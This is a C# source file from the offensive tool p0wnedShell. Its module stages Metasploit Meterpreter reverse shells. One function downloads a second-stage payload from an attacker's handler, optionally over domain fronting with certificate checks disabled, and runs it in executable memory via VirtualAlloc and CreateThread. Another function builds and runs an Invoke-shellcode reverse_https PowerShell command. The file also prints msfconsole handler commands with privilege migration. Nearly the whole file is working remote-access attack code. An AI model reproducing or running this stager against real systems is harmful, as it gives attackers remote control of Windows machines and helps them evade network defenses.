using System;
using System.Net;
using System.Linq;
using System.Runtime.InteropServices;

namespace p0wnedShell
{
    class p0wnedMeter
    {
        private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();

        private static MeterPreter MSF = new MeterPreter();

        public static void PowerBanner()
        {
            string[] toPrint = { "* Execute Metasploit reversed https Stager or Inject as Shellcode.  *" };
            Program.PrintBanner(toPrint);
        }

        public static void Menu()
        {
            PowerBanner();
            Console.WriteLine(" 1. Execute a Domain Fronting capable http(s) Meterpreter Stager.");
            Console.WriteLine();
            Console.WriteLine(" 2. Inject a Metasploit x86 Reversed https shellcode into Memory.");
            Console.WriteLine();
            Console.WriteLine(" 3. Back.");
            Console.Write("\nEnter choice: ");

            string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");

            int userInput = 0;
            while (true)
            {
                try
                {
                    userInput = Convert.ToInt32(Console.ReadLine());
                    if (userInput < 1 || userInput > 3)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                        Console.ResetColor();
                        Console.Write("Enter choice: ");
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.Write("Enter choice: ");
                }
            }

            switch (userInput)
            {
                case 1:
                    MeterStager(Arch);
                    break;
                case 2:
                    if (Arch == "x86")
                    {
                        InvokeMeter();
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx86\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    break;
                default:
                    break;
            }
        }

        public static void MeterStager(string Arch)
        {
            string[] toPrint = { "* Execute a Domain Fronting capable http(s) Meterpreter Stager.     *" };
            Program.PrintBanner(toPrint);

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[+] This Meterpreter http(s) stager is Domain Fronting capable and can help you in");
            Console.WriteLine("[+] circumventing Internet censorship (Intercepting proxies e.g).");
            Console.WriteLine("[+] In case you want to use Domain Fronting, make sure you setup a CDN Distribution to");
            Console.WriteLine("[+] route traffic to your own Domain (for example: AWS CloudFront).");
            Console.WriteLine("[+] Then pick a Fronting Domain from the following list by @vysec (other CDN's should work too).");
            Console.WriteLine("[+] https://github.com/vysec/DomainFrontingLists/blob/master/Cloudfront.txt.\n");
    
            string Lhost = null;
            int Lport = 0;
            bool UseHTTPS = true;
            bool UseDF = false;
            string Distribution = null;

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] If you want to use Domain Fronting, make sure you use a Fronting Domain as handler");
            Console.WriteLine("[+] so traffic will be routed correctly.\n");
            Console.ResetColor();
            Console.Write("[+] Enter ip address or (Fronting) Domain name of your Meterpreter handler: ");
            Console.ForegroundColor = ConsoleColor.Green;
            Lhost = Console.ReadLine().TrimEnd('\r', '\n');
            Console.ResetColor();
            if (Lhost == "")
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] This is not a valid hostname, please try again\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            while (true)
            {
                try
                {
                    Console.Write("[+] Now Enter the listening port of your Meterpreter handler (e.g. 443 or 8443): ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Lport = int.Parse(Console.ReadLine());
                    Console.ResetColor();

                    if (Lport < 1 || Lport > 65535)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
                        Console.ResetColor();
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
                    Console.ResetColor();
                }
            }

            Console.Write("[+] Do you want to use https (instead of plain http)? (y/n) > ");
            Console.ForegroundColor = ConsoleColor.Green;
            string input = Console.ReadLine();
            Console.ResetColor();
            switch (input.ToLower())
            {
                case "y":
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("\n[+] If you want to use Domain Fronting in combination with https, make sure");
                    Console.WriteLine("[+] you use valid public ssl/tls certificates (from Let's Encrypt e.g.)\n");
                    Console.ResetColor();
                    break;
                case "n":
                    UseHTTPS = false;
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            Console.Write("[+] Do you want to use Domain Fronting? (y/n) > ");
            Console.ForegroundColor = ConsoleColor.Green;
            input = Console.ReadLine();
            Console.ResetColor();
            switch (input.ToLower())
            {
                case "y":
                    UseDF = true;
                    Console.Write("[+] Enter fqdn of our CDN Distribution (For example: d2fadu0nynjpfn.cloudfront.net) : ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Distribution = Console.ReadLine().TrimEnd('\r', '\n');
                    Console.ResetColor();
                    if (Distribution == "")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid hostname, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n[+] Now make sure you setup your remote Meterpreter handler as follow:\n");
            Console.ResetColor();
            Console.WriteLine(@"[root@P0wnedHost ~]# msfconsole  ");
            Console.WriteLine(@"                                 ");
            Console.WriteLine(@"     ,           ,               ");
            Console.WriteLine(@"    /             \              ");
            Console.WriteLine(@"   ((__---,,,---__))             ");
            Console.WriteLine(@"      (_) O O (_)_________       ");
            Console.WriteLine(@"         \ _ /            |\     ");
            Console.WriteLine(@"          o_o \   M S F   | \    ");
            Console.WriteLine(@"               \   _____  |  *   ");
            Console.WriteLine(@"                |||   WW|||      ");
            Console.WriteLine(@"                |||     |||      ");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("use exploit/multi/handler");
            if (Arch == "x86")
            {
                if (UseHTTPS)
                {
                    Console.WriteLine("set PAYLOAD windows/meterpreter/reverse_https");
                }
                else
                {
                    Console.WriteLine("set PAYLOAD windows/meterpreter/reverse_http");
                }
            }
            else
            {
                if (UseHTTPS)
                {
                    Console.WriteLine("set PAYLOAD windows/x64/meterpreter/reverse_https");
                }
                else
                {
                    Console.WriteLine("set PAYLOAD windows/x64/meterpreter/reverse_http");
                }
            }
            Console.WriteLine("set LHOST " + Lhost);
            Console.WriteLine("set LPORT " + Lport);
            if (UseDF)
            {
                Console.WriteLine("set HttpHostHeader "+ Distribution);
                if (UseHTTPS)
                {
                    Console.WriteLine("set HandlerSSLCert /root/YourSSLCert.pem (Your custom SSL cert)");
                }
            }
            Console.WriteLine("set AutoRunScript post/windows/manage/priv_migrate");
            Console.WriteLine("set EnableUnicodeEncoding true");
            Console.WriteLine("set EnableStageEncoding true");
            Console.WriteLine("set ExitOnSession false");
            Console.WriteLine("exploit -j");
            Console.ResetColor();
            Console.WriteLine("\n[+] Ready to Rumble? then Press Enter (twice) to continue and wait for Shell awesomeness :)");
            Console.ReadLine();

            MSF.MSFConnect(Lhost, Lport, UseHTTPS, UseDF, Distribution);
            return;
        }

        public static void InvokeMeter()
        {
            string[] toPrint = { "* Inject Metasploit reversed https Shellcode into Memory.           *" };
            Program.PrintBanner(toPrint);

            IPAddress Lhost = IPAddress.Parse("1.1.1.1");
            int Lport = 0;

            while (true)
            {
                try
                {
                    Console.Write("Enter ip address of your Meterpreter handler (e.g. 1.1.1.1): ");
                    Lhost = IPAddress.Parse(Console.ReadLine());
                    Console.WriteLine();
                    break;
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid IP address, Please Try again\n");
                    Console.ResetColor();
                }
            }

            while (true)
            {
                try
                {
                    Console.Write("Now Enter the listening port of your Meterpreter handler (e.g. 443 or 8443): ");
                    Lport = int.Parse(Console.ReadLine());
                    Console.WriteLine();

                    if (Lport < 1 || Lport > 65535)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[+] That's not a valid Port, Please Try again\n");
                        Console.ResetColor();
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] That's not a valid Port, Please Try again\n");
                    Console.ResetColor();
                }
            }

            string InvokeReverseShell = "";
            string WebProxy = Program.DetectProxy();

            if (WebProxy != null)
            {
                Console.Write("\n\n[+] The following web Proxy is detected: ");
                Console.ForegroundColor = ConsoleColor.Green;
                Console.Write("{0}", WebProxy);
                Console.ResetColor();
                Console.WriteLine();
                Console.Write("\n[+] Do you want to use this proxy? (y/n) > ");
                string input = Console.ReadLine();
                switch (input.ToLower())
                {
                    case "y":
                        InvokeReverseShell = "[net.webrequest]::defaultwebproxy = new-object net.webproxy \"" + WebProxy + "\" ;" +
                                             "[net.webrequest]::defaultwebproxy.credentials = [net.credentialcache]::defaultcredentials ;" +
                                             "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " + Lhost + " -Lport " + Lport + " -Force -verbose";
                        break;
                    case "n":
                        InvokeReverseShell = "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " + Lhost + " -Lport " + Lport + " -Force -verbose";
                        break;
                    default:
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                }
            }
            else
            {
                InvokeReverseShell = "Invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost " + Lhost + " -Lport " + Lport + " -Force";
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n\n[+] Now make sure you setup your remote Meterpreter handler as follow:\n");
            Console.ResetColor();
            Console.WriteLine(@"[root@P0wnedHost ~]# msfconsole  ");
            Console.WriteLine(@"                                 ");
            Console.WriteLine(@"     ,           ,               ");
            Console.WriteLine(@"    /             \              ");
            Console.WriteLine(@"   ((__---,,,---__))             ");
            Console.WriteLine(@"      (_) O O (_)_________       ");
            Console.WriteLine(@"         \ _ /            |\     ");
            Console.WriteLine(@"          o_o \   M S F   | \    ");
            Console.WriteLine(@"               \   _____  |  *   ");
            Console.WriteLine(@"                |||   WW|||      ");
            Console.WriteLine(@"                |||     |||      ");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("use exploit/multi/handler");
            Console.WriteLine("set PAYLOAD windows/meterpreter/reverse_https");
            Console.WriteLine("set LHOST " + Lhost);
            Console.WriteLine("set LPORT " + Lport);
            Console.WriteLine("set AutoRunScript post/windows/manage/priv_migrate");
            Console.WriteLine("set ExitOnSession false");
            Console.WriteLine("exploit -j");
            Console.ResetColor();
            Console.WriteLine("\nReady to Rumble? then Press Enter to continue and wait for Shell awesomeness :)");
            Console.ReadLine();

            try
            {
                P0wnedListener.Execute(InvokeReverseShell);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            return;
        }

        class MeterPreter
        {
            [DllImport("kernel32")]
            private static extern IntPtr VirtualAlloc(
                IntPtr lpAddress,
                UInt32 dwSize,
                UInt32 flAllocationType,
                UInt32 flProtect
                );

            [DllImport("kernel32")]
            private static extern IntPtr CreateThread(
                UInt32 lpThreadAttributes,
                UInt32 dwStackSize,
                IntPtr lpStartAddress,
                IntPtr lpParameter,
                UInt32 dwCreationFlags,
                ref UInt32 lpThreadId
                );

            [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(
                [In] IntPtr hHandle,
                [In] UInt32 dwMilliseconds
                );

            public bool MSFConnect(string Listener, int Port, bool UseHTTPS, bool UseDF, string FrontDomain)
            {
                Random RandomNumber = new Random((int)DateTime.Now.Ticks);

                if (UseHTTPS == true)
                {
                    GetStage1("https://" + Listener + ":" + Port + "/" + GenHTTPChecksum(RandomNumber), true, UseDF, FrontDomain);
                }
                else
                {
                    GetStage1("http://" + Listener + ":" + Port + "/" + GenHTTPChecksum(RandomNumber), false, UseDF, FrontDomain);
                }

                return true;
            }

            private static bool ValidateServerCertficate(object sender, System.Security.Cryptography.X509Certificates.X509Certificate cert, System.Security.Cryptography.X509Certificates.X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors)
            {
                return true;
            }

            static string RandomString(Random r, int s)
            {
                char[] buffer = new char[s];
                string chars = "chars";
                for (int i = 0; i < s; i++)
                {
                    buffer[i] = chars[r.Next(chars.Length)];
                }
                return new string(buffer);
            }

            static bool checksum8(string s)
            {
                return ((s.ToCharArray().Select(x => (int)x).Sum()) % 0x100 == 92);
            }

            static string GenHTTPChecksum(Random r)
            {
                string baseString = "";
                for (int i = 0; i < 64; ++i)
                {
                    baseString = RandomString(r, 3);
                    string randChars = new string("oHD9EjJcITqhVYleFRX47sNLtKx6gWnG8wU0iaP5C1pdSrbMuZfBzmyvk23OAQ".ToCharArray().OrderBy(s => (r.Next(2) % 2) == 0).ToArray());
                    for (int j = 0; j < randChars.Length; ++j)
                    {
                        string url = baseString + randChars[j];
                        if (checksum8(url))
                        {
                            return url;
                        }
                    }
                }
                return "9vXU";
            }

            public bool GetStage1(string ListenerURL, bool UseHTTPS, bool UseDF, string FrontDomain)
            {
                UInt32 MEM_COMMIT = 0x1000;
                UInt32 MEM_RESERVE = 0x2000;
                UInt32 PAGE_EXECUTE_READWRITE = 0x40;
                IntPtr hThread = IntPtr.Zero;
                IntPtr lpParameter = IntPtr.Zero;
                UInt32 threadId = 0;

                if (UseHTTPS == true)
                {
                    ServicePointManager.ServerCertificateValidationCallback = ValidateServerCertficate;
                }
                WebClient MSFWebClient = new System.Net.WebClient();
                MSFWebClient.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)");
                MSFWebClient.Headers.Add("Accept", "*/*");
                MSFWebClient.Headers.Add("Accept-Language", "en-gb,en;q=0.5");
                MSFWebClient.Headers.Add("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
                if (UseDF == true)
                {
                    MSFWebClient.Headers.Add("Host", FrontDomain);
                }
                byte[] MSFStageBuffer = null;

                try
                {
                    HttpWebRequest TestProxy = (HttpWebRequest)WebRequest.Create(ListenerURL);
                    IWebProxy webProxy = TestProxy.Proxy;
                    if (webProxy != null)
                    {
                        MSFWebClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                        MSFWebClient.Proxy = webProxy;
                    }

                    MSFStageBuffer = MSFWebClient.DownloadData(ListenerURL);
                    if (MSFStageBuffer.Length < 100000) return false;
                }
                catch (WebException)
                {
                    return false;
                }

                UInt32 AllocationFlags = MEM_COMMIT | MEM_RESERVE;
                IntPtr MSFfuncAddr = VirtualAlloc(IntPtr.Zero, (UInt32)MSFStageBuffer.Length, AllocationFlags, PAGE_EXECUTE_READWRITE);

                Marshal.Copy(MSFStageBuffer, 0, (IntPtr)(MSFfuncAddr), MSFStageBuffer.Length);

                hThread = CreateThread(0, 0, MSFfuncAddr, lpParameter, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);

                return true;
            }
        }
    }
}